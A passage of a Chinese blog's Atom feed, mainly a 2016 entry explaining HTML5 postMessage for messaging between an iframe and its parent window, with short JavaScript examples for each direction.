      &lt;p&gt;iis6.0:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>通过postMessage在iframe和父窗口之间通信</title>
    <link href="http://myt0.com/2016/05/06/postMessage-and-iframe/"/>
    <id>http://myt0.com/2016/05/06/postMessage-and-iframe/</id>
    <published>2016-05-06T13:32:00.000Z</published>
    <updated>2017-06-04T14:03:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>在HTML5中新增了postMessage方法，postMessage可以实现跨文档消息传输（Cross Document Messaging）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">postMessage(data,origin)</span><br><span class="line"></span><br><span class="line">data：要传的数据</span><br><span class="line">origin： 字符串参数，指明目标窗口的源，协议+主机+端口号。如果为*则是所有的窗口，如果要指定和当前窗口同源的话设置为&quot;/&quot;。</span><br></pre></td></tr></table></figure></p>
<p>子页面传给父页面<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//子页面</span></span><br><span class="line"><span class="built_in">window</span>.parent.postMessage(data,<span class="string">'*'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//父页面</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e.data);</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure></p>
<p>父页面传给子页面</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父页面</span></span><br><span class="line"><span class="built_in">window</span>.frames[<span class="number">0</span>].postMessage(data,<span class="string">'http://test.com:port'</span>);<span class="comment">//第二个参数为子页面地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//子页面</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(e.source != <span class="built_in">window</span>.parent) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(e.data);</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在HTML5中新增了postMessage方法，postMessage可以实现跨文档消息传输（Cross Document Messaging）&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;
    
    </summary>
    
    
      <category term="javascript" scheme="http://myt0.com/tags/javascript/"/>
    
  </entry>
  
</feed>
